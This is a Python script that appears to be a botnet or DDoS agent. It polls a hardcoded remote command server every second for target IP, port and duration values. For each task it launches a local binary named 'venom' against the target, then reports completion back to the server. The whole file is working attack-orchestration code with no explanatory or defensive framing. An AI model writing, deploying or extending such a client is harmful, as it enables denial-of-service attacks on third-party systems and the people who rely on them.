import requests
import subprocess
import time

BASE_URL = 'http://37.114.46.10:8010'
SOUL_PATH = '/venom/'
DONE_PATH = '/venom/done'


active_tasks = {}

def process_new_task(added):
    ip = added.get('ip')
    port = added.get('port')
    time_val = added.get('time')

    if ip and port and time_val:
        key = (ip, str(port), str(time_val))
        if key not in active_tasks:
            print(f"[+] New task added: IP={ip}, Port={port}, Time={time_val}")
            try:
                
                process = subprocess.Popen(['./venom', ip, str(port), str(time_val), '100'])
                print(f"[+] Launched binary: ./< {ip} {port} {time_val} 100 (PID: {process.pid})")


            except Exception as e:
                print(f"[!] Failed to launch binary: {e}")
            active_tasks[key] = int(time_val) 
        else:
            
            pass
    else:
        print("[!] Task received but missing ip, port, or time values")

def main_loop():
    while True:
        try:
            response = requests.get(f'{BASE_URL}{SOUL_PATH}')
            response.raise_for_status()
            data = response.json()

            
            if isinstance(data, dict):
                if data.get('success') and 'added' in data:
                    process_new_task(data['added'])
            elif isinstance(data, list):
                for item in data:
                    if isinstance(item, dict) and item.get('success') and 'added' in item:
                        process_new_task(item['added'])

            
            tasks_to_delete = []
            for key in list(active_tasks.keys()):
                active_tasks[key] -= 1
                if active_tasks[key] <= 0:
                    ip, port, orig_time = key
                    print(f"[+] Time expired for task: IP={ip}, Port={port}, Original Time={orig_time}")
                    try:
                        del_resp = requests.get(f'{BASE_URL}{DONE_PATH}',
                                                params={'ip': ip, 'port': port, 'time': orig_time})
                        if del_resp.status_code == 200:
                            print(f"[+] Sent delete request for IP={ip}, Port={port}, Time={orig_time}")
                        else:
                            print(f"[!] Delete request failed with status: {del_resp.status_code}")
                    except Exception as e:
                        print(f"[!] Failed to send delete request: {e}")
                    tasks_to_delete.append(key)

            
            for key in tasks_to_delete:
                active_tasks.pop(key, None)

            time.sleep(1)
        except requests.RequestException as e:
            print(f"[!] Request error: {e}")
            time.sleep(1)
        except Exception as e:
            print(f"[!] General error: {e}")
            time.sleep(1)

if __name__ == '__main__':
    main_loop()
    
